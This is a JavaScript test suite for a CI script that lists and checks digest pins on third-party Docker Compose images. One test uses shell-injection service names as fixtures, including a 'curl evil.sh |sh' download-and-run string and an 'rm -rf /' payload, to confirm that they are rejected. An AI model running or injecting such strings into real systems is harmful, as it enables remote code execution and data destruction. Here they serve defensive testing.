// Self-tests for the third-party image enumerator (#369). Run with
// `node --test .github/scripts/compose-images.test.mjs`.
//
// The load-bearing cases are the ones that MUST refuse: a mutable tag, a
// bare digest with no tag, and — the one this whole change exists because of —
// an empty result set reporting success. A scan job over zero images is green,
// and that green reads as "every pin is clean" when nothing was examined.

import test from "node:test";
import assert from "node:assert/strict";
import {
  collectThirdPartyImages,
  assertAllPinnedByDigest,
  assertNonEmpty,
  assertRenderIsComplete,
  countRawImageDeclarations,
  countRenderedImageDeclarations,
  formatMatrix,
  run,
} from "./compose-images.mjs";

const DIGEST = "sha256:617c253c5d960e257ec153d582cc62f191461baba6863bd6b498ae062d3d5c19";
const PG_DIGEST = "sha256:3a82e1f56c8f0f5616a11103ac3d47e632c3938698946a7ad26da0df1334744a";

const doc = (services, path = "compose.json") => ({ path, config: { services } });

// --- what counts as third-party -----------------------------------------

test("a service with build: is first-party and is skipped", () => {
  const images = collectThirdPartyImages([
    doc({
      app: { build: { context: ".." } },
      db: { image: `postgres:18.4-trixie@${PG_DIGEST}` },
    }),
  ]);
  assert.deepEqual(images.map((i) => i.ref), [`postgres:18.4-trixie@${PG_DIGEST}`]);
});

test("build: wins even when the service also names an image", () => {
  // Compose lets `image:` name the BUILD OUTPUT. Keying off `image` presence
  // would misclassify a locally built service as third-party and try to pull it.
  const images = collectThirdPartyImages([
    doc({ app: { build: { context: ".." }, image: "cluckwork-api:local" } }),
  ]);
  assert.deepEqual(images, []);
});

test("a service with neither build nor image throws rather than being ignored", () => {
  assert.throws(
    () => collectThirdPartyImages([doc({ mystery: { ports: ["80:80"] } })]),
    /service "mystery" has neither "build" nor "image"/,
  );
});

test("a blank image string is not silently treated as absent", () => {
  assert.throws(
    () => collectThirdPartyImages([doc({ db: { image: "   " } })]),
    /neither "build" nor "image"/,
  );
});

// --- malformed input fails closed ---------------------------------------

test("a document with no services key throws", () => {
  assert.throws(
    () => collectThirdPartyImages([{ path: "c.json", config: {} }]),
    /has no "services" key/,
  );
});

test("services rendered as an array throws", () => {
  assert.throws(
    () => collectThirdPartyImages([{ path: "c.json", config: { services: [] } }]),
    /"services" is not an object/,
  );
});

test("a null service spec throws", () => {
  assert.throws(
    () => collectThirdPartyImages([doc({ db: null })]),
    /service "db" is not an object/,
  );
});

// --- the service name is passed downstream, so it is constrained -----------

test("a service name with shell metacharacters is refused", () => {
  // It reaches an Actions matrix and a log line, and on a fork pull_request the
  // compose file is contributor-controlled. Compose would reject these itself;
  // this refuses to be the layer that relies on that.
  for (const name of ['db"; curl evil.sh |sh; #', "db $(id)", "db`id`", "db\nrm -rf /", "db'"]) {
    assert.throws(
      () => collectThirdPartyImages([doc({ [name]: { image: `postgres:18@${PG_DIGEST}` } })]),
      /outside compose's own \[A-Za-z0-9\._-\]\+ grammar/,
      `expected ${JSON.stringify(name)} to be refused`,
    );
  }
});

test("ordinary compose service names are accepted", () => {
  for (const name of ["db", "otel-collector", "app_1", "web.edge"]) {
    assert.doesNotThrow(() =>
      collectThirdPartyImages([doc({ [name]: { image: `postgres:18@${PG_DIGEST}` } })]),
    );
  }
});

// --- dedupe across files -------------------------------------------------

test("the same digest pinned in two files is scanned once, crediting both", () => {
  const images = collectThirdPartyImages([
    doc({ db: { image: `postgres:18.4-trixie@${PG_DIGEST}` } }, "prod.json"),
    doc({ db: { image: `postgres:18.4-trixie@${PG_DIGEST}` } }, "dev.json"),
  ]);
  assert.equal(images.length, 1);
  assert.deepEqual(images[0].usedBy, ["prod.json:db", "dev.json:db"]);
});

test("different digests of the same repository are distinct images", () => {
  const images = collectThirdPartyImages([
    doc({
      a: { image: `postgres:18.4-trixie@${PG_DIGEST}` },
      b: { image: `postgres:18.4-trixie@${DIGEST}` },
    }),
  ]);
  assert.equal(images.length, 2);
});

// --- the pin gate --------------------------------------------------------

test("tag + digest passes", () => {
  assert.doesNotThrow(() =>
    assertAllPinnedByDigest([
      { ref: `traefik:v3.7.10@${DIGEST}`, usedBy: ["c.json:traefik"] },
      { ref: `ghcr.io/owner/repo:v1.2.3@${DIGEST}`, usedBy: ["c.json:x"] },
      { ref: `registry.example.com:5000/team/app:2026-08-01@${DIGEST}`, usedBy: ["c.json:y"] },
    ]),
  );
});

test("a mutable tag with no digest is rejected — the #369 defect itself", () => {
  assert.throws(
    () => assertAllPinnedByDigest([{ ref: "traefik:v3.5", usedBy: ["deploy/docker-compose.yml:traefik"] }]),
    /not pinned to an immutable digest[\s\S]*traefik:v3\.5[\s\S]*deploy\/docker-compose\.yml:traefik/,
  );
});

test("a bare repository name with no tag at all is rejected", () => {
  assert.throws(
    () => assertAllPinnedByDigest([{ ref: "traefik", usedBy: ["c.json:traefik"] }]),
    /not pinned to an immutable digest/,
  );
});

test("a digest with no tag is rejected — reviewable staleness is the point", () => {
  // `traefik@sha256:...` IS immutable, so it is tempting to accept. It is
  // rejected because a reader cannot tell a digest from last week from one from
  // eight months ago, which is exactly how v3.5 survived unnoticed.
  assert.throws(
    () => assertAllPinnedByDigest([{ ref: `traefik@${DIGEST}`, usedBy: ["c.json:traefik"] }]),
    /not pinned to an immutable digest/,
  );
});

test("a truncated or non-hex digest is rejected", () => {
  for (const ref of [
    "traefik:v3.7.10@sha256:617c253c",
    `traefik:v3.7.10@sha512:${"a".repeat(64)}`,
    `traefik:v3.7.10@sha256:${"g".repeat(64)}`,
    `traefik:v3.7.10@sha256:${"a".repeat(63)}`,
  ]) {
    assert.throws(
      () => assertAllPinnedByDigest([{ ref, usedBy: ["c.json:traefik"] }]),
      /not pinned to an immutable digest/,
      `expected ${ref} to be rejected`,
    );
  }
});

test("every offender is reported, not just the first", () => {
  assert.throws(
    () =>
      assertAllPinnedByDigest([
        { ref: "traefik:v3.5", usedBy: ["c.json:traefik"] },
        { ref: "postgres:18", usedBy: ["c.json:db"] },
      ]),
    /traefik:v3\.5[\s\S]*postgres:18/,
  );
});

// --- the empty-set backstop ---------------------------------------------

test("an empty image set throws instead of reporting a clean scan", () => {
  assert.throws(() => assertNonEmpty([]), /no third-party images found/);
});

test("the empty-set message names the wildcard profile, the likeliest cause", () => {
  assert.throws(() => assertNonEmpty([]), /--profile/);
});

test("a compose document of only built services yields nothing and therefore throws", () => {
  // End-to-end of the dangerous shape: the document is perfectly well-formed,
  // so nothing upstream errors — the scan simply covers zero images.
  const images = collectThirdPartyImages([
    doc({ app: { build: { context: ".." } }, migrate: { build: { context: ".." } } }),
  ]);
  assert.deepEqual(images, []);
  assert.throws(() => assertNonEmpty(images), /no third-party images found/);
});

// --- the render-completeness cross-check ---------------------------------
//
// This is the section that exists because the check WITHOUT it was verified to
// pass while missing a service: rendering deploy/docker-compose.yml with no
// `--profile '*'` drops the profile-gated traefik and exits 0 on Postgres alone.

test("counts image: declarations and ignores commented-out ones", () => {
  const raw = [
    "services:",
    "  app:",
    "    build:",
    "      context: ..",
    "  db:",
    "    image: postgres:18@sha256:abc",
    "  traefik:",
    "    profiles: [prod]",
    "    # image: traefik:v3.5   <- the old pin, left as a note",
    "    image: traefik:v3.7.10@sha256:def",
  ].join("\n");
  assert.equal(countRawImageDeclarations(raw), 2);
});

test("a top-level (unindented) image: key is not counted as a service image", () => {
  assert.equal(countRawImageDeclarations("image: not-a-service\n"), 0);
});

test("an image: key with no value is not counted", () => {
  assert.equal(countRawImageDeclarations("  image:\n"), 0);
});

test("the rendered count includes a build service that also names an image", () => {
  // It is a DECLARATION, so it must be counted, even though it is excluded from
  // scanning. Counting only scan targets would make the two sides incomparable.
  const n = countRenderedImageDeclarations([
    doc({
      app: { build: { context: ".." }, image: "cluckwork-api:local" },
      db: { image: `postgres:18.4-trixie@${PG_DIGEST}` },
      migrate: { build: { context: ".." } },
    }),
  ]);
  assert.equal(n, 2);
});

test("matching counts pass", () => {
  assert.doesNotThrow(() => assertRenderIsComplete(2, 2));
});

test("a render short of the source is rejected and names the profile cause", () => {
  assert.throws(() => assertRenderIsComplete(2, 1), /1 service\(s\) were dropped[\s\S]*--profile/);
});

test("a render LONGER than the source is also rejected", () => {
  // Means the cross-check is pointed at the wrong files, so its guarantee is
  // void in the other direction. Silently accepting it would let a genuinely
  // dropped service hide behind an uncounted extra one.
  assert.throws(() => assertRenderIsComplete(1, 2), /reading the wrong files/);
});

test("a rendered file named without its source is refused", () => {
  // The pairing is what makes the completeness check unforgettable. An
  // unpaired path would run the weaker check silently, so it is refused.
  assert.throws(
    () =>
      run(["c.json"], files({
        "c.json": JSON.stringify({ services: { db: { image: `postgres:18@${PG_DIGEST}` } } }),
      })),
    /expected <source-compose\.yml>=<rendered\.json>, got "c\.json"/,
  );
});

test("a malformed pair is refused rather than half-interpreted", () => {
  for (const arg of ["=c.json", "raw.yml=", "="]) {
    assert.throws(
      () => run([arg], files({})),
      /expected <source-compose\.yml>=<rendered\.json>/,
      `expected ${JSON.stringify(arg)} to be refused`,
    );
  }
});

test("a rendered path containing '=' still pairs on the FIRST separator", () => {
  const out = run(["raw.yml=/tmp/a=b.json"], files({
    "raw.yml": `services:\n  db:\n    image: postgres:18@${PG_DIGEST}\n`,
    "/tmp/a=b.json": JSON.stringify({ services: { db: { image: `postgres:18@${PG_DIGEST}` } } }),
  }));
  assert.equal(out, `postgres:18@${PG_DIGEST}`);
});

test("findings are labelled by SOURCE path, not by the rendered temp file", () => {
  // The whole reason for the pairing: a failing scan must tell a reader where
  // to go and edit, which is never /tmp/resolved-....json.
  const images = collectThirdPartyImages([
    { path: "deploy/docker-compose.yml", config: { services: { traefik: { image: "traefik:v3.5" } } } },
  ]);
  assert.deepEqual(images[0].usedBy, ["deploy/docker-compose.yml:traefik"]);
});

test("MUTATION: the dropped profile-gated service is caught end-to-end", () => {
  // The source declares both images; the render (no --profile '*') carries only
  // Postgres. Before the cross-check existed this exact input exited 0.
  const rawYaml = [
    "services:",
    "  db:",
    `    image: postgres:18.4-trixie@${PG_DIGEST}`,
    "  traefik:",
    "    profiles: [prod]",
    `    image: traefik:v3.7.10@${DIGEST}`,
  ].join("\n");
  const rendered = JSON.stringify({
    services: { db: { image: `postgres:18.4-trixie@${PG_DIGEST}` } },
  });

  assert.throws(
    () =>
      run(["raw.yml=c.json"], files({ "raw.yml": rawYaml, "c.json": rendered })),
    /1 service\(s\) were dropped/,
  );

  // ...and the SAME source with a complete render passes, so the test above is
  // failing for the omission and not for some unrelated defect in the fixture.
  const complete = JSON.stringify({
    services: {
      db: { image: `postgres:18.4-trixie@${PG_DIGEST}` },
      traefik: { image: `traefik:v3.7.10@${DIGEST}` },
    },
  });
  const out = run(
    ["raw.yml=c.json"],
    files({ "raw.yml": rawYaml, "c.json": complete }),
  );
  assert.equal(out.split("\n").length, 2);
});

test("the cross-check sums across several raw files", () => {
  const out = run(
    ["a.yml=a.json", "b.yml=b.json"],
    files({
      "a.yml": `services:\n  db:\n    image: postgres:18@${PG_DIGEST}\n`,
      "b.yml": `services:\n  db:\n    image: postgres:18@${PG_DIGEST}\n`,
      "a.json": JSON.stringify({ services: { db: { image: `postgres:18@${PG_DIGEST}` } } }),
      "b.json": JSON.stringify({ services: { db: { image: `postgres:18@${PG_DIGEST}` } } }),
    }),
  );
  assert.equal(out, `postgres:18@${PG_DIGEST}`); // deduped for scanning, both counted
});

// --- matrix output -------------------------------------------------------

test("the matrix strips the digest from the display name but not the ref", () => {
  const matrix = JSON.parse(
    formatMatrix([{ ref: `traefik:v3.7.10@${DIGEST}`, usedBy: ["c.json:traefik"] }]),
  );
  assert.deepEqual(matrix, [
    { ref: `traefik:v3.7.10@${DIGEST}`, name: "traefik:v3.7.10", usedBy: "c.json:traefik" },
  ]);
});

test("the matrix is valid JSON for fromJSON() even with several images", () => {
  const out = formatMatrix([
    { ref: `postgres:18.4-trixie@${PG_DIGEST}`, usedBy: ["a:db"] },
    { ref: `traefik:v3.7.10@${DIGEST}`, usedBy: ["a:traefik"] },
  ]);
  assert.equal(JSON.parse(out).length, 2);
  assert.ok(!out.includes("\n"), "matrix must be a single line for GITHUB_OUTPUT");
});

// --- the CLI wrapper -----------------------------------------------------

const files = (map) => ({
  readFile: (p) => {
    if (!(p in map)) throw new Error("ENOENT");
    return map[p];
  },
});

test("run() lists refs one per line", () => {
  const out = run(["raw.yml=c.json"], files({
    "raw.yml": `services:\n  app:\n    build: {}\n  traefik:\n    image: traefik:v3.7.10@${DIGEST}\n`,
    "c.json": JSON.stringify({
      services: { app: { build: {} }, traefik: { image: `traefik:v3.7.10@${DIGEST}` } },
    }),
  }));
  assert.equal(out, `traefik:v3.7.10@${DIGEST}`);
});

test("run() reads several documents and dedupes", () => {
  const raw = `services:\n  db:\n    image: postgres:18.4-trixie@${PG_DIGEST}\n`;
  const body = JSON.stringify({ services: { db: { image: `postgres:18.4-trixie@${PG_DIGEST}` } } });
  const out = run(
    ["a.yml=a.json", "b.yml=b.json"],
    files({ "a.yml": raw, "b.yml": raw, "a.json": body, "b.json": body }),
  );
  assert.equal(out.split("\n").length, 1);
});

test("run() with no paths explains itself", () => {
  assert.throws(() => run([], files({})), /usage: compose-images\.mjs/);
});

test("run() rejects an unknown option rather than treating it as a path", () => {
  assert.throws(() => run(["--json", "c.json"], files({})), /unknown option "--json"/);
});

test("run() rejects an unknown --format", () => {
  assert.throws(() => run(["--format", "yaml", "c.json"], files({})), /unknown --format "yaml"/);
});

test("run() names the file it could not read", () => {
  assert.throws(
    () => run(["raw.yml=missing.json"], files({ "raw.yml": "" })),
    /missing\.json: cannot read/,
  );
});

test("run() names the unreadable SOURCE file too", () => {
  assert.throws(
    () => run(["gone.yml=c.json"], files({ "c.json": "{}" })),
    /gone\.yml: cannot read/,
  );
});

test("run() names the file that was not JSON", () => {
  assert.throws(
    () => run(["raw.yml=c.json"], files({
      "raw.yml": "",
      "c.json": "services:\n  db:\n",
    })),
    /c\.json: not valid JSON/,
  );
});

test("run() fails on a mutable pin end-to-end", () => {
  assert.throws(
    () =>
      run(["raw.yml=c.json"], files({
        "raw.yml": "services:\n  traefik:\n    image: traefik:v3.5\n",
        "c.json": JSON.stringify({ services: { traefik: { image: "traefik:v3.5" } } }),
      })),
    /not pinned to an immutable digest/,
  );
});
